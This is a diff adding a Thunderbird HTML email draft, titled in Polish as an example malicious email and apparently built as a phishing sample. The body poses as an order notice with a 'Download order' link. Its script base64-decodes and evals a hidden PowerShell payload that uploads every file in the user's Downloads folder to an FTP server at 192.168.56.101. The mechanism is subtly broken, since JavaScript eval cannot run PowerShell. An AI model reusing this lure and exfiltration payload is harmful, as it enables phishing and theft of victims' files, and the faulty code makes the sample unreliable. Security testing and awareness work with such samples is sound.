@@ -1,0 +1,50 @@
+Message-ID: <1234@gmail.com>
+Date: Mon, 28 Oct 2024 10:06:34 -0400
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+Content-Language: en-US
+To: test@gmail.com
+From: Lukasz Kali <test@gmail.com>
+Subject: =?UTF-8?Q?Przyk=C5=82ad_Szkodliwego_E-maila?=
+X-Mozilla-Draft-Info: internal/draft; vcard=0; receipt=0; DSN=0; uuencode=0;
+ attachmentreminder=0; deliveryformat=2
+X-Identity-Key: id1
+Fcc: imap://test%40gmail.com@imap.gmail.com/[Gmail]/Sent Mail
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html>
+  <head>
+
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  </head>
+  <body>
+    <script>
+        // Przykład szkodliwego kodu JavaScript
+        function runPowerShell() {
+            var shellCode = "JGZ0cFNlcnZlciA9ICJmdHA6Ly8xOTIuMTY4LjU2LjEwMSIKJHVzZXJuYW1lID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUuU3BsaXQoJ1wnKVsxXQokbG9jYWxGb2xkZXIgPSAiQzpcVXNlcnNcJHVzZXJuYW1lXERvd25sb2FkcyIKJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKJGNsaWVudC5DcmVkZW50aWFscyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCgiYW5vbnltb3VzIiwgImFub255bW91cyIpCgokZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRsb2NhbEZvbGRlcgoKZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7CiAgICAkZnRwRmlsZVBhdGggPSAiJGZ0cFNlcnZlci91cGxvYWRzLyQoJGZpbGUuTmFtZSkiCiAgICAKICAgIHRyeSB7CiAgICAgICAgJGxvY2FsRmlsZVBhdGhXaXRoVXNlciA9ICIkbG9jYWxGb2xkZXJcJCgkZmlsZS5OYW1lKSIKICAgICAgICAkY2xpZW50LlVwbG9hZEZpbGUoJGZ0cEZpbGVQYXRoLCAiU1RPUiIsICRsb2NhbEZpbGVQYXRoV2l0aFVzZXIpCiAgICB9IGNhdGNoIHsKICAgICAgICAjdGVzdAogICAgfQp9";
+
+            // Dekodowanie Base64 i uruchomienie kodu
+            var encoded = atob(shellCode); // Dekoduje Base64
+            eval(encoded); // Uruchamia dekodowany kod
+        }
+
+        // Dodaj zdarzenie do linku
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("maliciousLink").addEventListener("click", function(event) {
+                event.preventDefault(); // Zatrzymaj domyślne działanie linku
+                runPowerShell(); // Uruchom kod
+            });
+        });
+    </script>
+    <h1>Witaj!</h1>
+    <p>Oto Twoje zamówienie. Kliknij w poniższy link, aby uzyskać więcej
+      informacji:</p>
+    <a href="#" id="maliciousLink">Pobierz zamówienie</a>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1.0">
+    <title>Przykład Szkodliwego E-maila</title>
+  </body>
+</html>
